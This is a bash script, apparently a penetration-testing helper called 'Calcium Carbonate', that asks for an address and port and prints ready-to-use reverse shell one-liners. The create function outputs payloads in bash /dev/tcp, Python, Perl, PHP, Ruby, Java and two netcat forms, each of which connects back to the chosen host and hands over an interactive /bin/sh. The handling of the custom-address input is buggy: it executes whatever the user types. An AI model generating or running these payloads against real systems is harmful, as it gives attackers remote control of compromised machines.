#!/bin/bash

halp(){
echo "Calcium Carbonate by fmlsec"
echo ""
echo "A script created to automatically create tailored simple reverse shells."
echo ""
read -sn 1 -p "Press any key to continue..."
clear
init
}

init(){
echo Calcium Carbonate 
echo by @fmlsec
echo ""
echo "1. Any Address"
echo "2. Determine Local Address"
echo "3. Help"
echo "4. Exit"
echo ""
read -p ">" menuop
if [ $menuop -eq 1 ]; then
	custom
elif [ $menuop -eq 2 ]; then
	dunnoaddr
elif [ $menuop -eq 3 ]; then
	halp
elif [ $menuop -eq 4 ]; then
	exit
else
	echo "Invalid option selected. exiting..."
fi
}
custom(){
echo "Enter local address for reverse shells"
read -p ">" $cust
custom=$($cust)
confirm
}

dunnoaddr(){
padding=2
lines=$(netstat -i | wc -l)
interfaces="$(($lines-$padding))"
loop=3
echo 'Network interfaces present= '$interfaces ";"
echo ""
until [ $interfaces = 0 ]
do
	netstat -i | head -$loop | tail -1 | cut -c 1-4 
	interfaces=$[$interfaces-1]
	loop=$[$loop+1]	

done
echo ""
echo Enter network interface to use
read -p ">" intr
addr=$(ifconfig $intr | grep "inet" | cut -d ':' -f 2 | cut -b 14-28 | cut -d ' ' -f1)
confirm
}
confirm(){
echo "Enter port for reverse connection"
read -n 5 -p ">" port
nums='^[0-9]+$'
if ! [[ $port =~ $nums ]]
then
	echo "Port must be numeric"
	sleep 1
	confirm
fi
clear
echo "Confirm Selections;"
echo "CTRL+C to cancel"
if [ -z $addr ]
then
	address=$custom
elif
	[ -z $custom ]
then
	address=$addr
fi

echo $address ":" $port
sleep 3
echo okaaaay
create
}

create(){
clear
linebreak="----------------------------------------------------------------------------"
echo "Reverse shells;"
echo ""
echo "BASH -> " "bash -i >& /dev/tcp/"$address"/"$port" 0>&1"
echo $linebreak
echo "PYTHON -> " "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""$address"","$port"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
echo $linebreak
echo "PERL -> " "perl -e 'use Socket;$i=\"$address\";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
echo $linebreak
echo "PHP -> " "php -r '$sock=fsockopen(\"$address\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
echo $linebreak
echo "RUBY -> " "ruby -rsocket -e'f=TCPSocket.open(\"$address\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)"
echo $linebreak
echo "JAVA -> " "r = Runtime.getRuntime()"
echo "p = r.exec([\"/bin/bash\",\"-c\",\"\"exec 5<>/dev/tcp/\"$address\"/\"$port\";cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])\""
echo "p.waitFor()"
echo $linebreak
echo "NETCAT 1 ->" "nc -e /bin/sh "$address" "$port
echo $linebreak
echo "NETCAT 2 ->" "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "$address"" $port" >/tmp/f"
echo ""
}
clear
init

